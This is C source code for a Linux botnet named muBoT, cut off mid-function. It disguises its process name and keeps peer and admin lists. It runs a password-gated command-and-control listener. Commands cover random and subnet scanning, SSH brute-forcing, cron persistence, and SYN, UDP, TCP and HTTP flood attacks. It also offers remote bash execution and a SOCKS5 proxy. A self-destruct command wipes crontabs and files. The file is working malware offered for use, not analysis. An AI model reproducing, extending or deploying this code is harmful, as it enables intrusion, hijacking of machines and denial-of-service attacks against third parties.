/////////////////////CONFIG////////////////////////////////
#define VERSION "v0.23ya.21mu-xmas-torum" // Death String
#define fNAME ".muBoT"		// BIN Filename
#define admDB ".adm"		// Admin DB Name
#define cliDB ".cli"		// Slave DB Name
#define PASS "bitch"		// logmein pass
#define FAKENAME "[cpuset]"	// hide process as.
#define ADMPORT 31337		// Admin Control Port
#define SYNCPORT 1337		// Slave Sync Port
#define SYNCTIME 10000		// Sync Slaves Every x Secs
///////////////////////////////////////////////////////////
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <arpa/inet.h>                  // for inet_addr, inet_ntop
#include <assert.h>                     // for assert
#include <errno.h>                      // for errno, EALREADY, EINPROGRESS
#include <ifaddrs.h>                    // for ifaddrs, freeifaddrs, getifaddrs
#include <limits.h>                     // for PATH_MAX
#include <netdb.h>                      // for addrinfo, freeaddrinfo, gai_s...
#include <netinet/in.h>                 // for sockaddr_in, INET_ADDRSTRLEN
#include <stdarg.h>                     // for va_end, va_list, va_start
#include <stdio.h>                      // for NULL, printf, pclose, popen
#include <stdlib.h>                     // for exit, srand, free, malloc, rand
#include <string.h>                     // for strcmp, strlen, strstr, strchr
#include <strings.h>                    // for bcopy
#include <sys/ioctl.h>                  // for ioctl, FIONBIO
#include <sys/select.h>                 // for fd_set, FD_ISSET, FD_SET, FD_...
#include <sys/socket.h>                 // for setsockopt, AF_INET, SOL_SOCKET
#include <sys/sysinfo.h>                // for sysinfo
#include <sys/utsname.h>                // for utsname, uname
#include <sys/wait.h>                   // for waitpid, WNOHANG
#include <time.h>                       // for time
#include <unistd.h>                     // for sleep, close, fork, getpid
#include <pthread.h>
#include <errno.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#define BUFFER_SZ 4096
#define NANO_PER_SEC 1000000000.0
char buf[BUFFER_SZ / 2];

static char scan[BUFFER_SZ/2];
static char topic[BUFFER_SZ/2];

extern char *__progname;
char *sortadm, *sortcli;
int rlen, sock;
char disabled=1,dispass[256];
unsigned long spoofs=0, spoofsm=0, numpids=0, running=0 ,childs=0,sek=0,pid=0,*pids,status;
//int *pids;
int checker(char input[],char check[]);


typedef struct clientInfo
{
	int clientSocket;
	struct sockaddr_in clientAddress;
}clientInfo;

typedef struct listenerInfo
{
	int listenerSocket,connSocket;
	struct sockaddr_in listenerAddress, clientAddr;
}listenerInfo;


clientInfo *clSocket(char *ipaddr, int port)
{
	clientInfo *sock;
	sock=(clientInfo *) malloc (sizeof(clientInfo));
	memset(&sock->clientAddress,'0',sizeof(sock->clientAddress));
	sock->clientSocket = socket(AF_INET,SOCK_STREAM,0);

	if (sock -> clientSocket == -1)
	{
		//printf("\nunable to initialise client");
		exit(1);
	}
	sock->clientAddress.sin_family = AF_INET; 
	sock->clientAddress.sin_port = htons(port); // network byte order 
	sock->clientAddress.sin_addr.s_addr = inet_addr(ipaddr); 
	//memcpy(&sock->clientAddress.sin_addr.s_addr,inet_addr(ipaddr),sizeof(inet_addr(ipaddr)));
	return sock;
}

listenerInfo *ltSocket(int port)
{

	listenerInfo *sock;
	sock=(listenerInfo *)malloc(sizeof(listenerInfo));
	sock -> listenerSocket=socket(AF_INET,SOCK_STREAM,0);

	if(sock -> listenerSocket==-1)
	{
		perror("unable to initialise listener");
		exit(1);
	}

	memset(&sock -> listenerAddress,'0',sizeof(sock -> listenerAddress));   

	sock->listenerAddress.sin_family = AF_INET;
	sock->listenerAddress.sin_addr.s_addr = htonl(INADDR_ANY);
	sock->listenerAddress.sin_port=htons(port);

	if(bind(sock -> listenerSocket, (struct sockaddr *) &sock -> listenerAddress , sizeof(sock -> listenerAddress) ) == -1)
	{
		//printf("unable to bind listenerSocket");
		exit(1);
	}

	if(listen(sock -> listenerSocket,50) == -1)
	{
		//printf("unable to listen ");
		exit(1);
	}

	return sock;
}

pid_t child_pid = -1 ; //Global

void kill_child(int sig)
{
	kill(child_pid,SIGKILL);
}

int Send(char *words, ...) {
	int pid,k;
	char uname[40],buffer[1024],msg[1024];
	char *ipaddr;
	FILE * fp;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;
	static char textBuffer[1024];
	va_list args;
	va_start(args, words);
	vsprintf(textBuffer, words, args);
	va_end(args);
	char *working_dir_path = realpath(".", NULL);
	char gwdadbp[1024];
	sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);
	fp = fopen(gwdadbp, "r");
	if (fp == NULL)
		exit(EXIT_FAILURE);
	clientInfo *sock;

	while ((read = getline(&line, &len, fp)) != -1) {
		ipaddr = line;
		sock = clSocket(ipaddr,ADMPORT);
		k = (connect(sock->clientSocket , (struct sockaddr *) &sock->clientAddress , sizeof(sock->clientAddress)));
		if(k!=-1)
		{
			write(sock->clientSocket,textBuffer,strlen(textBuffer));
			sleep(1);
		}
		close(sock->clientSocket);

	}
	fclose(fp);
}


int AdmSend(char *words, ...) {
	int pid,k;
	char uname[40],buffer[1024],msg[1024];
	char *ipaddr;
	FILE * fp;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;
	static char textBuffer[1024];
	va_list args;
	va_start(args, words);
	vsprintf(textBuffer, words, args);
	va_end(args);
	char *working_dir_path = realpath(".", NULL);
	char gwdadbpadm[1024];
	sprintf(gwdadbpadm,"%s/%s",working_dir_path,admDB);
	fp = fopen(gwdadbpadm, "r");
	if (fp == NULL)
		exit(EXIT_FAILURE);
	clientInfo *sock;

	while ((read = getline(&line, &len, fp)) != -1) {
		ipaddr = line;
		sock = clSocket(ipaddr,ADMPORT);
		k = (connect(sock->clientSocket , (struct sockaddr *) &sock->clientAddress , sizeof(sock->clientAddress)));
		if(k!=-1)
		{
			write(sock->clientSocket,textBuffer,strlen(textBuffer));
			sleep(1);
		}
		close(sock->clientSocket);
	}
	fclose(fp);
}


void logmein(char *s) {
	static char textBuffer[1024];
	char i1[128]= "";
	char *text = s;
	sscanf(text, "%s", &i1);
	sprintf(textBuffer,"%s",i1);

	if (!disabled) {
		AdmSend("Already logged in\n");
		return;
	}
	if (strcasecmp(PASS,textBuffer)) {
		Send("Wrong password\n");
		return;
	}
	disabled=0;
	Send("Password correct.\n");
}


void logout(char *s) {
	static char textBuffer[1024];
	char i1[128]= "";
	char *text = s;
	sscanf(text, "%s", &i1);
	sprintf(textBuffer,"%s",i1);
	if (disabled) {
		AdmSend("Already logout.\n");
	}
	if (strcasecmp(PASS,textBuffer)) {
		AdmSend("Wrong password\n");
		return;
	}
	disabled=1;
	//	memset(dispass,0,256);
	//	strcpy(PASS,textBuffer);
	AdmSend("Logout sucessful.\n");
}


int mfork() {
	if (disabled == 1) {
		Send("Unable to comply.\n");
		return 1;
	}
	unsigned int parent, *newpids, i;
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}

int afork() {
	unsigned int parent, *newpids, i;
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}




int Reg(char *words, ...) {
	int pid,k;
	char uname[40],buffer[1024],msg[1024];
	char *ipaddr;
	FILE * fp;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;
	static char textBuffer[1024];
	va_list args;
	va_start(args, words);
	vsprintf(textBuffer, words, args);
	va_end(args);
	char *working_dir_path = realpath(".", NULL);
	char gwdadbp[1024];
	sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);

	fp = fopen(gwdadbp, "r");
	if (fp == NULL)
		exit(EXIT_FAILURE);
	clientInfo *sock;

	while ((read = getline(&line, &len, fp)) != -1) {
		ipaddr = line;
		sock = clSocket(ipaddr,SYNCPORT);
		k = (connect(sock->clientSocket , (struct sockaddr *) &sock->clientAddress , sizeof(sock->clientAddress)));
		if(k!=-1)
		{
			write(sock->clientSocket,textBuffer,strlen(textBuffer));
			sleep(1);
		}
		close(sock->clientSocket);
	}
	fclose(fp);
}


void strip_newline(char *s){
	while (*s != '\0') {
		if (*s == '\r' || *s == '\n') {
			*s = '\0';
		}
		s++;
	}
}


int getip(void) {
	int i;
	int k;

	i = 4;//NUM OF SERVERS
	k = 0;
	srand((unsigned)time(NULL));
	k = rand() % i;
	return k;
}

const char* xlist[] = {
	"ip.tyk.nu:443", "icanhazip.com:443",
	"checkip.amazonaws.com:443", "myip.dnsomatic.com:443",
};

//const char* xlist[] = {
//        "95.216.101.209:443", "104.20.16.242:443",
//        "34.196.181.158:443", "146.112.255.205:443",
//};




//////////////////////MODULE//////////////////////

//////////////////////EXPLOITS////////////////////
//NONE
/////////////////////SCANNER//////////////////////
#include "Scanner/RNDScanner.c"
#include "Scanner/SUBNETScanner.c"
#include "Scanner/AutoScan.c"
/////////////////////AUTOSTART///////////////////
#include "Autostart/cron.c"
/////////////////////BRUTEFORCE//////////////////
#include "BruteForce/SSH.c"
//////////////////////DOS/////////////////////////////
#include "DoS/SSYN2.c"
#include "DoS/UDP.c"
#include "DoS/tcp.c"
#include "DoS/webDoS.c"
///////////////////////////APPS//////////////////////////
#include "Apps/bash.c"
#include "Apps/SysInfo.c"
#include "Apps/socket5.c"
/////////////////////MISC///////////////////////////
#include "Misc/ASCIIlogo.c"

void peers(char *s){

	int pid,k;
	char uname[40],buffer[1024],msg[1024];
	char *ipaddr;
	FILE * fp;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;
	static char textBuffer[1024];
	char i1[128]= "";
	char *text = s;
	sscanf(text, "%s", &i1);
	//	Send("%s\n",i1);
	char *working_dir_path = realpath(".", NULL);
	char gwdadbp[1024];
	sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);


	fp = fopen(gwdadbp, "r");
	if (fp == NULL)
		exit(EXIT_FAILURE);

	clientInfo *sock;
	if (afork()) { 
		while ((read = getline(&line, &len, fp)) != -1) {
			sprintf(textBuffer,"!peers %s\n",line);
			ipaddr = i1;
			sock = clSocket(ipaddr,SYNCPORT);
			k = (connect(sock->clientSocket , (struct sockaddr *) &sock->clientAddress , sizeof(sock->clientAddress)));
			if(k!=-1)
			{
				write(sock->clientSocket,textBuffer,strlen(textBuffer));
				sleep(1);
			}
			close(sock->clientSocket);
			sleep(1);
		}
		fclose(fp);
		exit(1);
	}
}





int addme() {
	if (afork() != 0) return; 
zur:
	while(1){
		//
		//  Initialize the variables
		//
		BIO* bio;
		SSL* ssl;
		SSL_CTX* ctx;

		//
		//   Registers the SSL/TLS ciphers and digests.
		//
		//   Basically start the security layer.
		//
		SSL_library_init();

		//
		//  Creates a new SSL_CTX object as a framework to establish TLS/SSL
		//  or DTLS enabled connections
		//
		ctx = SSL_CTX_new(SSLv23_client_method());

		//
		//  -> Error check
		//
		if (ctx == NULL)
		{
			sleep(1);
			goto zur;

		}

		//
		//   Creates a new BIO chain consisting of an SSL BIO
		//
		bio = BIO_new_ssl_connect(ctx);

		//
		//  Use the variable from the beginning of the file to create a 
		//  string that contains the URL to the site that you want to connect
		//  to while also specifying the port.
		//

		char *ipchecker;
		ipchecker =xlist[getip()];

		BIO_set_conn_hostname(bio, ipchecker);

		//
		//   Attempts to connect the supplied BIO
		//
		if(BIO_do_connect(bio) <= 0)
		{
			sleep(1);
			goto zur;
		}
		else
		{

		}

		//
		//  The bare minimum to make a HTTP request.
		//



		char *bla;
		asprintf(&bla, "POST / HTTP/1.0\r\nHost: %s\r\n\r\n",ipchecker);
		// do something with bla
		const char *mystr = bla;


		//
		//   Attempts to write len bytes from buf to BIO
		//
		if(BIO_write(bio, mystr, strlen(mystr)) <= 0)
		{
			//
			//  Handle failed writes here
			//
			if(!BIO_should_retry(bio))
			{
				sleep(1);
				goto zur;
				// Not worth implementing, but worth knowing.
			}

			//
			//  -> Let us know about the failed writes
			//
			sleep(1);
			goto zur;
		}

		//
		//  Variables used to read the response from the server
		//
		int size;
		char buf[1024];

		//
		//  Read the response message
		//
		for(;;)
		{
			//
			//  Get chunks of the response 1023 at the time.
			//
			size = BIO_read(bio, buf, 1023);

			//
			//  If no more data, then exit the loop
			//
			if(size <= 0)
			{
				break;
			}

			//
			//  Terminate the string with a 0, to let know C when the string 
			//  ends.
			//
			buf[size] = 0;

			//
			//  ->  Print out the response
			//
			char *buffi = buf; // Get HTTP response from URL
			char *content = strstr(buf, "\r\n\r\n");

			const char *target = content;
			char bufz[256];
			sscanf(target, "%s", bufz); // Trimming on both sides occurs here


			if (content != NULL) {
				content += 4; // Offset by 4 bytes to start of content
				Reg("!add %s", bufz);
				sleep(SYNCTIME);
			}
			else {


				content = buf; // Didn't find end of header, write out everything
				Reg("!add %s", bufz);
				sleep(SYNCTIME);
			}
		}

		//
		//  Clean after ourselves
		//
		BIO_free_all(bio);
		SSL_CTX_free(ctx);

	}

}
void RegIt(){

	int len;  
	listenerInfo *sock;
	sock=ltSocket(SYNCPORT);
	len = sizeof(sock->clientAddr);

	if (afork() != 0) return; 
	while (1) {
		if ((sock->connSocket=accept(sock->listenerSocket , (struct sockaddr *) &sock->clientAddr  , &len )) != -1)
			memset(buf,'\0',1024);
		rlen = read(sock->connSocket,buf,1024);
		buf[rlen] = '\0';
		strip_newline(buf);

		/* Ignore empty buffer */
		if (!strlen(buf)) {
			continue;
		}

		/* Special options */
		if (buf[0] == '!') {

			char *command, *param;
			command = strtok(buf," ");

			if (!strcmp(command, "!peers")) {
				param = strtok(NULL, " ");
				if (param) {
					scan[0] = '\0';
					while (param != NULL) {
						strcat(scan, param);
						strcat(scan, " ");
						param = strtok(NULL, " ");
					}

					char *working_dir_path = realpath(".", NULL);
					char gwdadbp[1024];
					sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);
					char myTxt[1024];
					FILE *out = fopen(gwdadbp, "a");
					char addpeersdbapp[1024] = {0};
					sprintf(addpeersdbapp, "sort -u -o %s %s\n" , gwdadbp, gwdadbp);
					system(addpeersdbapp);
					myTxt[0] = 0;
					fprintf(out, "%s\n", scan);
					fclose(out);
					system(addpeersdbapp);
				}

			} else if (strcmp(command, "!admpeers") == 0) {

				param = strtok(NULL, " ");
				if (param) {
					scan[0] = '\0';
					while (param != NULL) {
						strcat(scan, param);
						strcat(scan, " ");
						param = strtok(NULL, " ");
					}
					char *working_dir_path = realpath(".", NULL);
					char gwdadbpadm[1024];
					sprintf(gwdadbpadm,"%s/%s",working_dir_path,admDB);
					char myTxt[1024];
					FILE *out = fopen(gwdadbpadm, "a");

					myTxt[0] = 0;
					fprintf(out, "%s\n", scan);	
					fclose(out);
					char addadmpeerdbapp[1024] = {0};
					sprintf(addadmpeerdbapp, "sort -u -o %s %s\n" , gwdadbpadm, gwdadbpadm);

					system(addadmpeerdbapp);
					//AdmSend("Added Client\n");

				}
			} else if (!strcmp(command, "!add")) {

				param = strtok(NULL, " ");
				if (param) {
					scan[0] = '\0';
					while (param != NULL) {
						strcat(scan, param);
						strcat(scan, " ");
						param = strtok(NULL, " ");
					}
					char *pointer;
					pointer = strchr(command, '!add');
					{
						char *working_dir_path = realpath(".", NULL);
						char gwdadbp[1024];
						sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);
						char myTxt[1024];
						char adddbapp[1024] = {0};
						FILE *out = fopen(gwdadbp, "a");
						sprintf(adddbapp, "sort -u -o %s %s\n" , gwdadbp, gwdadbp);
						system(adddbapp);
						myTxt[0] = 0;
						fprintf(out, "%s\n", scan);
						fclose(out);



						system(adddbapp);

						//Send("Added Client");


						char *s = ("%s\n", scan);

						peers(s);


					}

				}

			}

		}close(sock->connSocket);

	}

}


void admpeers(char *s){

	int pid,k;
	char uname[40],buffer[1024],msg[1024];
	char *ipaddr;
	FILE * fp;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;
	static char textBuffer[1024];
	char i1[128]= "";
	char *text = s;
	sscanf(text, "%s", &i1);
	//	Send("%s",i1);
	char *working_dir_path = realpath(".", NULL);
	char gwdadbp[1024];
	sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);
	fp = fopen(gwdadbp, "r");
	if (fp == NULL)
		exit(EXIT_FAILURE);

	clientInfo *sock;
	if (fork() == 0) 
		while ((read = getline(&line, &len, fp)) != -1) {
			sprintf(textBuffer,"!admpeers %s",i1);
			ipaddr = line;
			sock = clSocket(ipaddr,SYNCPORT);
			k = (connect(sock->clientSocket , (struct sockaddr *) &sock->clientAddress , sizeof(sock->clientAddress)));
			if(k!=-1)
			{
				write(sock->clientSocket,textBuffer,strlen(textBuffer));
				sleep(1);
			}
			close(sock->clientSocket);
			sleep(1);
		}
	else
		fclose(fp);
	kill((pid_t) getppid(), SIGTERM);
}


char *makestring() {
	signal(SIGALRM,(void (*)(int))kill_child);
	child_pid = fork();
	if (child_pid > 0) {
		wait(NULL);

	}
	else if (child_pid == 0){
		struct sysinfo info;
		sysinfo(&info);
		int days;
		FILE *fp;
		char path[1035];

		char *tmp;
		char *myip;
		char bufz[256];
		struct utsname my_uname;
		if(uname(&my_uname) == -1)
			exit(0);
		else

			days = info.uptime / 86400;

		//
		//  Initialize the variables
		//

		BIO* bio;
		SSL* ssl;
		SSL_CTX* ctx;

		//
		//   Registers the SSL/TLS ciphers and digests.
		//
		//   Basically start the security layer.
		//
		SSL_library_init();

		//
		//  Creates a new SSL_CTX object as a framework to establish TLS/SSL
		//  or DTLS enabled connections
		//
		ctx = SSL_CTX_new(SSLv23_client_method());

		//
		//  -> Error check
		//
		if (ctx == NULL)
		{
			AdmSend("[%ld][%s][%s][%s][N/A]\n",days,my_uname.nodename,my_uname.machine, my_uname.release);
			exit(0);
		}

		//
		//   Creates a new BIO chain consisting of an SSL BIO
		//
		bio = BIO_new_ssl_connect(ctx);

		//
		//  Use the variable from the beginning of the file to create a 
		//  string that contains the URL to the site that you want to connect
		//  to while also specifying the port.
		//

		char *ipchecker;
		ipchecker =xlist[getip()];

		BIO_set_conn_hostname(bio, ipchecker);

		//
		//   Attempts to connect the supplied BIO
		//
		if(BIO_do_connect(bio) <= 0)
		{
			AdmSend("[%ld][%s][%s][%s][N/A]\n",days,my_uname.nodename,my_uname.machine, my_uname.release);
			exit(0);
		}
		else
		{

		}

		//
		//  The bare minimum to make a HTTP request.
		//



		char *bla;
		asprintf(&bla, "POST / HTTP/1.0\r\nHost: %s\r\n\r\n",ipchecker);
		// do something with bla
		const char *mystr = bla;


		//
		//   Attempts to write len bytes from buf to BIO
		//
		if(BIO_write(bio, mystr, strlen(mystr)) <= 0)
		{
			//
			//  Handle failed writes here
			//
			if(!BIO_should_retry(bio))
			{
				// Not worth implementing, but worth knowing.
			}

			//
			//  -> Let us know about the failed writes
			//
			AdmSend("[%ld][%s][%s][%s][N/A]\n",days,my_uname.nodename,my_uname.machine, my_uname.release);
			exit(0);
		}

		//
		//  Variables used to read the response from the server
		//
		int size;
		char buf[1024];

		//
		//  Read the response message
		//
		for(;;)
		{
			//
			//  Get chunks of the response 1023 at the time.
			//
			size = BIO_read(bio, buf, 1023);

			//
			//  If no more data, then exit the loop
			//
			if(size <= 0)
			{
				break;
			}

			//
			//  Terminate the string with a 0, to let know C when the string 
			//  ends.
			//
			buf[size] = 0;

			//
			//  ->  Print out the response
			//
			char *buffi = buf; // Get HTTP response from URL
			char *content = strstr(buf, "\r\n\r\n");

			const char *target = content;

			sscanf(target, "%s", bufz); // Trimming on both sides occurs here

			BIO_free_all(bio);
			SSL_CTX_free(ctx);

			AdmSend("[%ld][%s][%s][%s][%s]\n",days,my_uname.nodename,my_uname.machine, my_uname.release, bufz);
			exit(0);
		}
	}
}
char *die() {
	if (disabled == 1) {
		AdmSend("Unable to comply\n");
	}
	char exe[1024];
	int ret;

	ret = readlink("/proc/self/exe",exe,sizeof(exe)-1);

	exe[ret] = 0;
	char diedie[1024] = {0};
	char *working_dir_path = realpath(".", NULL);
	char gwdadbp[1024];
	sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);
	char gwdadbpadm[1024];
	sprintf(gwdadbpadm,"%s/%s",working_dir_path,admDB);

	sprintf(diedie, "(crontab -r >/dev/null 2>&1);rm -rf %s %s %s\n" , fNAME, gwdadbpadm, gwdadbp);
	char exec[1024] = {0};
	AdmSend("Purge BoT>RM AUTOSTART>KILL BoT>RM DBs...\n");
	system(diedie);
	kill(pid, SIGKILL);

}

getcmd(){
	int len;  
	listenerInfo *sock;
	sock=ltSocket(ADMPORT);
	len = sizeof(sock->clientAddr);

	char buff_out[BUFFER_SZ];
	if (afork() != 0) return;
sa:
	while (1) {

		if ((sock->connSocket=accept(sock->listenerSocket , (struct sockaddr *) &sock->clientAddr  , &len )) != -1)
			memset(buf,'\0',1024);
		rlen = read(sock->connSocket,buf,1024);
		char *ipsc;
		//		AdmSend(buf);
		buff_out[0] = '\0';
		buf[rlen] = '\0';
		strip_newline(buf);

		/* Ignore empty buffer */
		if (!strlen(buf)) {
			continue;
		}

		/* Special options */
		if (buf[0] == '!') {

			char *command, *param;
			command = strtok(buf," ");

			if (!strcmp(command, "!rndscan")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!rndscan');
				{

					char *s = ("%s", pointer + 7);
					scanner(s);
				}
			}else if (!strcmp(command, "!suba")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}

				char *pointer;
				pointer = strchr(command, '!suba');
				{

					char *s = ("%s", pointer + 2);

					subneta(s);

				}
			}else if (!strcmp(command, "!subb")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}

				char *pointer;
				pointer = strchr(command, '!subb');
				{

					char *s = ("%s", pointer + 2);

					subnetb(s);

				}
			}else if (!strcmp(command, "!subc")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}

				char *pointer;
				pointer = strchr(command, '!subc');
				{

					char *s = ("%s", pointer + 2);

					subnetc(s);

				}
			}else if (!strcmp(command, "!autoscan")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!autoscan');
				{

					char *s = ("%s", pointer + 2);

					autoscan(s);

				}

			}else if (!strcmp(command, "!bash")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}

				char *pointer;
				pointer = strchr(command, '!bash');
				{

					char *s = ("%s", pointer + 2);

					bash(s);

				}
			}else if (!strcmp(command, "!sysinfo")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}


				sysinfos();

			}else if (!strcmp(command, "!ssyn2")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!ssyn2');
				{

					char *s = ("%s\n", pointer + 2);

					ssyn2(s);

				}

			}else if (!strcmp(command, "!udp")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!udp');
				{

					char *s = ("%s\n", pointer + 2);

					udp(s);

				}
			}else if (!strcmp(command, "!tcp")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!tcp');
				{

					char *s = ("%s\n", pointer + 2);

					tcp(s);

				}
			}else if (!strcmp(command, "!webdos")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!webdos');
				{

					char *s = ("%s\n", pointer + 2);

					webdos(s);

				}

			}else if (!strcmp(command, "!socks5srv")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!socks5srv');
				{

					char *s = ("%s\n", pointer + 2);
					AdmSend(s);
					socks5srv(s);

				}
			}else if (!strcmp(command, "!logmein")) {

				char *pointer;
				pointer = strchr(command, '!logmein');
				{

					char *s = ("%s\n", pointer + 2);

					logmein(s);

				}

			}else if (!strcmp(command, "!logout")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char *pointer;
				pointer = strchr(command, '!logout');
				{

					char *s = ("%s\n", pointer + 2);
					logout(s);

				}


			} else if (strcmp(command, "!glob") == 0) {

				param = strtok(NULL, " ");
				if (param) {
					scan[0] = '\0';
					while (param != NULL) {
						strcat(scan, param);
						strcat(scan, " ");
						param = strtok(NULL, " ");
					}
					Send("%s\n",scan);

				}

			}else if (!strcmp(command, "!dc")) {

				char *pointer;
				pointer = strchr(command, '!dc');
				{
					int pid,k;
					char *ipaddr;
					char * line = NULL;
					size_t len = 0;
					ssize_t read;
					static char textBuffer[1024];
					char *s = ("%s\n", pointer + 2);

					char i1[128]= "", i2[128]= "", i3[128]= "", i4[128]= "", i5[128]= "", i6[128]= "", i7[128]= "", i8[128]= "", i9[128]= "", i10[128]= "";
					char *text = s;
					sscanf(text, "%s %s %s %s %s", &i1, &i2, &i3, &i4, &i5, &i6, &i7, &i8, &i9, &i10);
					AdmSend(text);
					clientInfo *sock;

					sprintf(textBuffer,"%s %s %s %s %s %s %s %s\n",i2 ,i3 ,i4, i5 ,i6 ,i7 ,i8, i9, i10);
					ipaddr = i1;
					sock = clSocket(ipaddr,ADMPORT);
					k = (connect(sock->clientSocket , (struct sockaddr *) &sock->clientAddress , sizeof(sock->clientAddress)));
					if(k!=-1)
					{
						write(sock->clientSocket,textBuffer,strlen(textBuffer));
						sleep(1);
					}
					close(sock->clientSocket);

				}

			} else if(!strcmp(command, "!die")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				die();
			} else if(!strcmp(command, "!deladm")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				char dadm[1024] = {0};
				char *working_dir_path = realpath(".", NULL);
				char gwdadbpadm[1024];
				sprintf(gwdadbpadm,"%s/%s",working_dir_path,admDB);
				sprintf(dadm, "rm -rf %s;touch %s\n" , gwdadbpadm, gwdadbpadm);
				AdmSend("Delete Admin list\n");
				system(dadm);

			} else if (!strcmp(command, "!help")) {
				AdmSend("%s\n", logo);
				AdmSend("<< !help 	> show this\n");
				AdmSend("<< !logmein 	> !logmein <PASS>\n");
				if (disabled == 1) {
					Send("login first for more help\n");
					goto sa;
				}
				AdmSend("<< !rndscan 	> !rndscan 192.*.*.* <THREADS> <MINUTES>\n");
				AdmSend("<< !suba 	> !suba 192 <THREADS>\n");
				AdmSend("<< !subb 	> !subb 192.168 <THREADS>\n");
				AdmSend("<< !subc 	> !subc 192.168.0 <THREADS>\n");
				AdmSend("<< !autoscan 	> !autoscan <change range every x mins> <mins to run autoscan> <THREADS>\n");
				AdmSend("<< !ssyn2 	> !ssyn2 <target IP/hostname> <PORT> <THREADS> <TIME>\n");
				AdmSend("<< !udp 	> !udp <target IP/hostname> <PORT> <throttle (lower is faster)> <packet size> <THREADS> <SECS>\n");
				AdmSend("<< !webdos	> !webdos <hostname or ip> <port> <page path> <children> <loops/child>\n");
				AdmSend("<< !tcp 	> !tcp <target IP> <PORT> <THREADS> <pps limiter, -1 for no limit> <time>\n");
				AdmSend("<< !socks5srv 	> !socks5srv <PORT>  <-- start socks5srv");
				AdmSend("<< !sysinfo 	> shows systeminfo - IP>RAM>CPU\n");
				AdmSend("<< !dc		> !dc 192.168.178.1 !sysinfo < sends command to single bot\n");
				AdmSend("<< !bash 	> !dc 192.168.178.1 !bash ls -lsa < sends bash command\n");
				AdmSend("<< !glob 	> !glob !sysinfo < sends command global to all bots\n");
				AdmSend("<< !logout 	> !glob !logout <PASS> < sets bot password and disabled it\n");
				AdmSend("<< !logmein 	> !glob !logmein <PASS> < sets bot password and enabled it\n");
				AdmSend("<< !addadm 	> !glob !addadm <your ip> < glob admin reg\n");
				AdmSend("<< !list 	> !glob !list < show bot list\n");
				AdmSend("<< !deladm 	> !glob !deladm < delete all admins\n");
				AdmSend("<< !die		> !die < Clean PURGE of bot\n");
				AdmSend("<< INFO 	> use the !glob command to send to all\n");
				AdmSend("--------------------------------KNOW BUGS--------------------------------\n");
				AdmSend("<< NONE\n");
			} else if(!strcmp(command, "!list")) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}
				makestring();

			} else if (strcmp(command, "!addadm") == 0) {
				if (disabled == 1) {
					Send("Unable to comply.\n");
					goto sa;
				}

				param = strtok(NULL, " ");
				if (param) {
					scan[0] = '\0';
					while (param != NULL) {
						strcat(scan, param);
						strcat(scan, " ");
						param = strtok(NULL, " ");
					}
					char *pointer;
					pointer = strchr(command, '!addadm');
					{
						char *working_dir_path = realpath(".", NULL);
						char gwdadbpadm[1024];
						sprintf(gwdadbpadm,"%s/%s",working_dir_path,admDB);

						int line_num = 1;
						int find_result = 0;
						char temp[512];
						char myTxt[1024];
						FILE *fp = fopen(gwdadbpadm, "r");
						FILE *out = fopen(gwdadbpadm, "a");

						while(fgets(temp, 512, fp) != NULL) {
							if((strstr(temp, scan)) != NULL) {
								//AdmSend("Already Found u in DB\n", line_num);

								find_result++;
							}
							line_num++;
							break;
						}

						if(find_result == 0) {
							myTxt[0] = 0;
							fprintf(out, "%s \n", scan);					
							fclose(out);
							char addadmdbapp[1024] = {0};
							sprintf(addadmdbapp, "sort -u -o %s %s\n" , gwdadbpadm, gwdadbpadm);

							system(addadmdbapp);
							AdmSend("My Master > %s\n",scan);



							//	char *s = ("%s\n", scan);

							//	admpeers(s);

						}

						if(fp) {
							fclose(fp);

						}

					}

				}
			} else if (!strcmp(command, "!add")) {

				param = strtok(NULL, " ");
				if (param) {
					scan[0] = '\0';
					while (param != NULL) {
						strcat(scan, param);
						strcat(scan, " ");
